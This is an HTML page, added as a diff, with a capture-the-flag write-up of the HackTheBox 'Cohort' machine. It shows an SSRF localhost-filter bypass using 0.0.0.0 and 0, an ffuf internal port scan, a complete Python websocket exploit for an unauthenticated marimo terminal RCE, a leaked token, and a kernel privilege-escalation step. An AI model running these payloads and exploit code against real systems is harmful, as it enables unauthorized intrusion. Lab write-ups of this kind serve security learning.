@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<meta name="theme-color" content="#030305"/>
+<title>Cohort - HTB Write Up | pumkin</title>
+<meta name="description" content="HackTheBox Cohort (Easy, Linux) full write up: SSRF with 0.0.0.0 bypass, internal port scan, marimo CVE-2026-39987 RCE, pack2root privilege escalation."/>
+<link rel="icon" href="../cat.png"/>
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{--bg:#030305;--panel-bg:rgba(255,255,255,.03);--border:rgba(255,255,255,.06);--rose:#a855f7;--rose-dim:rgba(168,85,247,.15);--emerald:#34d399;--emerald-dim:rgba(52,211,153,.1);--text:#fafafa;--muted:#9ca3af;--dim:#6b7280}
+body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,-apple-system,sans-serif;min-height:100vh;overflow-x:hidden;position:relative}
+body::before{content:'';position:fixed;inset:0;background:linear-gradient(rgba(255,255,255,.015) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.015) 1px,transparent 1px);background-size:60px 60px;z-index:0;pointer-events:none}
+.cyber-grid{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
+.cyber-grid::before{content:'';position:absolute;width:100%;height:100%;background:radial-gradient(circle at 50% 0%,rgba(168,85,247,.08) 0%,transparent 50%),radial-gradient(circle at 80% 80%,rgba(52,211,153,.04) 0%,transparent 50%)}
+main{position:relative;z-index:1;min-height:100vh;width:100%;padding:2rem 1rem}
+@media(min-width:768px){main{padding:3rem 2rem}}
+.max-w{max-width:72rem;width:100%;margin:0 auto}
+.nav-row{display:flex;align-items:center;gap:1rem;margin-bottom:2rem;flex-wrap:wrap}
+.back-btn{display:inline-flex;align-items:center;gap:.5rem;padding:.5rem 1rem;border-radius:.75rem;background:var(--panel-bg);border:1px solid var(--border);color:var(--muted);text-decoration:none;font-family:'JetBrains Mono','Fira Code',monospace;font-size:.75rem;text-transform:uppercase;letter-spacing:.1em;transition:all .3s ease}
+.back-btn:hover{color:#c084fc;border-color:rgba(168,85,247,.5)}
+.back-btn svg{transition:transform .3s ease}
+.back-btn:hover svg{transform:translateX(-4px)}
+.panel{background:#0a0b0f;border:1px solid var(--border);border-radius:1rem;position:relative;overflow:hidden}
+.writeup-body{padding:2rem;max-width:60rem;margin:0 auto}
+@media(min-width:768px){.writeup-body{padding:3rem}}
+.meta{color:var(--dim);font-size:.75rem;font-family:'JetBrains Mono','Fira Code',monospace;letter-spacing:.1em;text-transform:uppercase;margin-bottom:1rem}
+h1{font-size:1.75rem;font-weight:800;letter-spacing:-.03em;color:white;text-transform:uppercase;margin-bottom:1.5rem}
+@media(min-width:768px){h1{font-size:2.5rem}}
+.writeup-body h2{font-size:1.25rem;font-weight:700;color:#c084fc;margin:2.5rem 0 1rem;padding-bottom:.5rem;border-bottom:1px solid var(--border)}
+.writeup-body h3{font-size:1rem;font-weight:700;color:#34d399;margin:1.5rem 0 .75rem}
+.writeup-body p{color:var(--muted);font-size:.95rem;line-height:1.75;margin-bottom:1rem}
+.writeup-body a{color:#c084fc;text-decoration:none;border-bottom:1px solid rgba(168,85,247,.3);transition:color .3s ease,border-color .3s ease}
+.writeup-body a:hover{color:#e9d5ff;border-color:rgba(168,85,247,.6)}
+.writeup-body ul,.writeup-body ol{color:var(--muted);font-size:.95rem;line-height:1.75;margin:0 0 1rem 1.25rem}
+.writeup-body li{margin-bottom:.25rem}
+.writeup-body strong{color:var(--text)}
+.writeup-body code{font-family:'JetBrains Mono','Fira Code',monospace;font-size:.85rem;background:rgba(168,85,247,.1);color:#c084fc;padding:2px 6px;border-radius:6px}
+.writeup-body pre{background:rgba(0,0,0,.5);border:1px solid var(--border);border-radius:.75rem;padding:1rem;margin:1rem 0;font-family:'JetBrains Mono','Fira Code',monospace;font-size:.8rem;color:var(--emerald);line-height:1.6;white-space:pre-wrap;word-wrap:break-word;overflow-wrap:anywhere}
+.writeup-body pre code{background:none;color:inherit;padding:0;border-radius:0}
+.section-tag{display:inline-block;padding:2px 10px;border-radius:9999px;font-size:.7rem;font-family:'JetBrains Mono','Fira Code',monospace;letter-spacing:.1em;text-transform:uppercase}
+.tag-easy{background:rgba(52,211,153,.1);border:1px solid rgba(52,211,153,.3);color:#34d399}
+.tag-linux{background:rgba(52,211,153,.1);border:1px solid rgba(52,211,153,.3);color:#34d399}
+.info-grid{display:grid;grid-template-columns:1fr;gap:.75rem;margin:1rem 0}
+@media(min-width:768px){.info-grid{grid-template-columns:repeat(3,1fr)}}
+.info-cell{background:rgba(0,0,0,.3);border:1px solid var(--border);border-radius:.75rem;padding:1rem}
+.info-cell .lbl{color:var(--dim);font-size:.65rem;font-family:'JetBrains Mono','Fira Code',monospace;text-transform:uppercase;letter-spacing:.1em;margin-bottom:.25rem}
+.info-cell .val{color:var(--text);font-size:.9rem;font-weight:600}
+.footer{text-align:center;padding-top:3rem;color:var(--dim);font-size:10px;font-family:'JetBrains Mono','Fira Code',monospace;letter-spacing:.15em;text-transform:uppercase}
+.fade-in{opacity:0;transform:translateY(20px);transition:opacity .6s ease,transform .6s ease}
+.fade-in.visible{opacity:1;transform:translateY(0)}
+</style>
+</head>
+<body>
+<div class="cyber-grid"></div>
+
+<main>
+<div class="max-w">
+  <div class="nav-row fade-in">
+    <a href="../writeups.html" class="back-btn">
+      <svg class="icon-sm" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg>
+      Write Ups
+    </a>
+    <a href="../index.html" class="back-btn">Home</a>
+  </div>
+
+  <div class="panel fade-in">
+    <div class="writeup-body">
+
+      <p class="meta">hackthebox / easy / linux</p>
+      <h1>Cohort</h1>
+
+      <div class="info-grid">
+        <div class="info-cell"><div class="lbl">Platform</div><div class="val">HackTheBox</div></div>
+        <div class="info-cell"><div class="lbl">Difficulty</div><div class="val"><span class="section-tag tag-easy">Easy</span></div></div>
+        <div class="info-cell"><div class="lbl">OS</div><div class="val"><span class="section-tag tag-linux">Linux</span></div></div>
+      </div>
+
+      <h2>Summary</h2>
+      <p>Cohort is an easy Linux box built around a single misconfiguration: a <strong>Server-Side Request Forgery</strong> in the <code>/api/validate</code> endpoint. The internal-domain blocklist is trivially bypassed with the <code>0.0.0.0</code>/<code>0</code> aliases, turning the SSRF into an internal port scanner. Two findings matter: an internal <strong>marimo notebook</strong> on port 8888 and the <code>cohort-edge</code> status endpoint, which leaks the notebook's vhost (<code>nb-1be3782a8afd3ad5.cohort.htb</code>). The vhost is routed externally, so we hit it directly with <strong>CVE-2026-39987</strong> (marimo unauthenticated terminal websocket RCE) for a shell as <code>marimo</code>, then reach root via the <strong>Pack2TheRoot</strong> kernel exploit.</p>
+
+      <h2>Skills Required</h2>
+      <ul>
+        <li>SSRF identification and blocklist bypass</li>
+        <li>Internal port scanning through an SSRF</li>
+        <li>Basic websocket exploitation</li>
+      </ul>
+
+      <h2>Skills Learned</h2>
+      <ul>
+        <li>SSRF <code>0.0.0.0</code>/<code>0</code> bypass for localhost filtering</li>
+        <li>Leveraging internal service discovery (status endpoints) for new vhosts</li>
+        <li>Exploiting marimo terminal websocket RCE (CVE-2026-39987)</li>
+        <li>Pack2TheRoot kernel exploit for privilege escalation</li>
+      </ul>
+
+      <h2>Enumeration</h2>
+      <p>A full port scan reveals SSH plus HTTP/HTTPS on nginx, with a wildcard certificate for <code>*.cohort.htb</code>.</p>
+      <pre>Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-03 10:58 -0400
+Nmap scan report for 10.129.159.201
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.18
+80/tcp  open  http     nginx 1.24.0 (Ubuntu)
+443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
+| ssl-cert: Subject: commonName=cohort.htb/organizationName=Cohort Analytics
+| Subject Alternative Name: DNS:cohort.htb, DNS:*.cohort.htb</pre>
+      <p>After mapping <code>10.129.159.201 cohort.htb</code> in <code>/etc/hosts</code>, directory enumeration turns up only <code>api</code> and <code>assets</code>. No subdomains or vhosts respond to brute force.</p>
+      <pre>directories - https://cohort.htb
+api     [Status: 301]
+assets  [Status: 301]</pre>
+
+      <h2>Foothold</h2>
+      <h3>SSRF and the localhost bypass</h3>
+      <p>The page at <code>/portal.html</code> contains an obvious SSRF primitive. Testing internal targets shows a blocklist, which is easily worked around.</p>
+      <pre>http://localhost/  # error: internal domains are not allowed, work around it
+http://0.0.0.0/     # works
+http://0/           # works</pre>
+      <p>Either alias resolves to loopback and returns the internal site's content:</p>
+      <pre>&lt;!doctype html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;
+&lt;meta charset="utf-8"&gt;
+&lt;title&gt;Cohort Analytics&lt;/title&gt;
+...
+&lt;script src="/assets/app.js" defer&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+
+      <h3>Internal port scan with ffuf</h3>
+      <p>The SSRF POST lives at <code>/api/validate</code>. Fuzzing the port in the URL with ffuf maps what's listening locally, filtering out the baseline error response (<code>-fs 86</code>).</p>
+      <pre>ffuf -w /usr/share/wordlists/ports.txt \
+  -X POST \
+  -H "Content-Type: application/json" \
+  -d '{"url":"http://0:FUZZ","format":"json"}' \
+  -u "https://cohort.htb/api/validate" -fs 86
+
+80    [Status: 200, Size: 1077]
+22    [Status: 200, Size: 58]
+443   [Status: 200, Size: 412]
+5000  [Status: 200, Size: 192]
+8888  [Status: 200, Size: 1515]</pre>
+      <p>Port 8888 stands out: it returns a <strong>marimo</strong> notebook login page. Marimo has a known RCE (<strong>CVE-2026-39987</strong>), but the service is bound to loopback and out of reach from our host.</p>
+
+      <h3>cohort-edge status</h3>
+      <p>The internal nginx on port 80 exposes a useful status endpoint at <code>http://0:80/status</code>.</p>
+      <pre>{"service":"cohort-edge","status":"ok","generated_by":"nginx","upstreams":[
+  {"name":"marketing","host":"cohort.htb","root":"/var/www/cohort"},
+  {"name":"insights-api","host":"cohort.htb","path":"/api/","target":"127.0.0.1:5000"},
+  {"name":"notebooks","host":"nb-1be3782a8afd3ad5.cohort.htb","target":"127.0.0.1:8888","note":"internal analyst workspace, not for external use"}
+]}</pre>
+      <p>The notebooks upstream names the vhost for the marimo instance. Mapping <code>nb-1be3782a8afd3ad5.cohort.htb</code> to the box in <code>/etc/hosts</code> gives us direct access to run the CVE.</p>
+
+      <h2>User Flag</h2>
+      <h3>marimo RCE - CVE-2026-39987</h3>
+      <p>The marimo terminal websocket at <code>/terminal/ws</code> accepts connections with no authentication. The exploit connects and feeds commands through the PTY:</p>
+      <pre>import asyncio, websockets, re
+import ssl
+
+ssl_context = ssl.create_default_context()
+ssl_context.check_hostname = False
+ssl_context.verify_mode = ssl.CERT_NONE
+
+async def exploit(host):
+    uri = f"wss://{host}/terminal/ws"
+    async with websockets.connect(uri, subprotocols=["terminal"], ssl=ssl_context) as ws:
+        print("[+] Connection established without authentication")
+        await asyncio.sleep(0.3)
+
+        # Read initial PTY banner
+        try:
+            msg = await asyncio.wait_for(ws.recv(), timeout=2)
+            print("[PTY banner]:", repr(msg))
+        except asyncio.TimeoutError:
+            pass
+
+        # Send command
+        await ws.send("id\n")
+        await asyncio.sleep(0.5)
+
+        # Read frames until timeout
+        output = []
+        while True:
+            try:
+                msg = await asyncio.wait_for(ws.recv(), timeout=1.5)
+                output.append(msg)
+            except asyncio.TimeoutError:
+                break
+
+        clean = re.sub(r'\x1b\[[0-9;?]*[a-zA-Z]', '', "".join(output)).strip()
+        print("[RCE output]:", clean)
+
+asyncio.run(exploit("nb-1be3782a8afd3ad5.cohort.htb"))</pre>
+      <p>The PTY tears the connection down as soon as the command finishes. Keep the socket alive while a real shell runs: <code>await asyncio.sleep(999999)  # keep the connection open indefinitely</code>. Grab the user flag from the shell.</p>
+
+      <h2>Privilege Escalation</h2>
+      <p>LinPEAS surfaces the marimo process command line, which includes a <strong>plaintext token</strong>:</p>
+      <pre>marimo  1621  0.2  1.4 291240 59032 ?  Ssl  14:53  0:47 /opt/marimo/venv/bin/python3 /opt/marimo/venv/bin/marimo edit /home/marimo/notebooks/retention.py --headless --host 127.0.0.1 -p 8888 --token --token-password YKQ6iPyO5kusNx0BpVAPfjP5 --skip-update-check --no-sandbox</pre>
+      <p>The token logs us into <code>https://nb-1be3782a8afd3ad5.cohort.htb/</code>, but that path is a rabbit hole. The reliable route to root is the <strong>Pack2TheRoot</strong> kernel exploit (<a href="https://github.com/0xdeadbeefnetwork/Pack2TheRoot">0xdeadbeefnetwork/Pack2TheRoot</a>). Compile the C file locally, transfer it to the victim with wget, and run it.</p>
+      <p>Root!</p>
+
+      <h2>Key Takeaways</h2>
+      <ul>
+        <li><strong>Localhost blocklists are trivially bypassed</strong> - the <code>0.0.0.0</code> and <code>0</code> aliases sailed past the internal-domain filter.</li>
+        <li><strong>An SSRF is a port scanner</strong> - combined with response-size filtering it maps the internal network cheaply.</li>
+        <li><strong>Status endpoints leak topology</strong> - <code>cohort-edge/status</code> handed us the internal notebook hostname verbatim.</li>
+        <li><strong>"Internal only" does not mean unreachable</strong> - once the vhost was known, reverse-proxy routing made the loopback service public.</li>
+        <li><strong>Read every process command line</strong> - plaintext secrets like the marimo token sit right in <code>ps</code> output.</li>
+        <li><strong>Pick the exploit that works, not the shiny one</strong> - the notebook token path dead-ended; Pack2Root got root quickly.</li>
+      </ul>
+
+    </div>
+  </div>
+
+  <p class="footer">pumkin / write ups</p>
+</div>
+</main>
+
+<script>
+const observer = new IntersectionObserver((entries) => {
+  entries.forEach(entry => {
+    if (entry.isIntersecting) {
+      entry.target.classList.add('visible');
+    }
+  });
+}, { threshold: 0 });
+
+document.querySelectorAll('.fade-in').forEach(el => observer.observe(el));
+</script>
+</body>
+</html>
